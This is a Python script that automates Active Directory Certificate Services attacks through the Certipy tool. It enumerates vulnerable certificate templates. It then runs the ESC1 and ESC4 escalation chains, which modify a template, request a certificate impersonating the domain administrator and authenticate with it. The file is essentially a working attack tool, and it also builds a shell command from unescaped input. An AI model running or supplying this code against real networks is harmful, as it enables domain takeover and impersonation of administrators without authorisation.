import subprocess
import json
import os
def run_certipy_find(username, password, domain, dc_ip=None):
    cmd = [
        "certipy-ad", "find",
        "-u", username,
        "-p", password,
        "-target", domain,
        "-text",
        "-stdout",
        "-vulnerable"
    ]
    if dc_ip:
        cmd += ["-dc-ip", dc_ip]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"[!] Certipy find failed: {e}")
        return None

def save_results_to_json(data, filepath):
    try:
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        print(f"[+] Results saved to {filepath}")
    except Exception as e:
        print(f"[!] Failed to save results: {e}")
# ESC1
def exploit_esc1(username, password, domain, dc_ip, ca_name, template_name):
    print("[*] Exploiting ESC1 vulnerability...")

    req_cmd = [
        "certipy-ad", "req",
        "-u", username,
        "-p", password,
        "-target", domain,
        "-upn", f"administrator@{domain}",
        "-ca", ca_name,
        "-template", template_name,
        "-key-size", "4096"
    ]

    print(f"[*] Running request command: {' '.join(req_cmd)}")
    try:
        subprocess.run(req_cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Certipy request failed: {e}")
        return

    # Build and run the faketime + auth command exactly as you'd run in terminal
    auth_cmd = f'faketime "$(ntpdate -q {domain} | cut -d \' \' -f 1,2)" certipy-ad auth -pfx administrator.pfx -domain {domain}'
    if dc_ip:
        auth_cmd += f' -dc-ip {dc_ip}'

    print(f"[*] Running auth command: {auth_cmd}")
    try:
        subprocess.run(auth_cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Certipy auth failed: {e}")
# ESC4
def exploit_esc4(domain, dc_ip, username, password, ca_name, template_name):
    user = f"{username}@{domain}"
    dns_name = f"admin.{domain}"
    upn = f"administrator@{domain}"
    pfx_file = "administrator.pfx"

    # Step 1: Write default config to the template
    subprocess.run([
        "certipy-ad", "template",
        "-username", user,
        "-password", password,
        "-template", template_name,
        "-write-default-configuration",
        "-dc-ip", dc_ip
    ], check=True)

    # Step 2: Request certificate with required SAN
    subprocess.run([
        "certipy-ad", "req",
        "-username", user,
        "-password", password,
        "-ca", ca_name,
        "-target", domain,
        "-template", template_name,
        "-upn", upn,
        "-dc-ip", dc_ip
    ], check=True)

    # Step 3: Authenticate using the obtained certificate
    subprocess.run([
        "certipy-ad", "auth",
        "-pfx", pfx_file,
        "-dc-ip", dc_ip,
        "-domain", domain
    ], check=True)

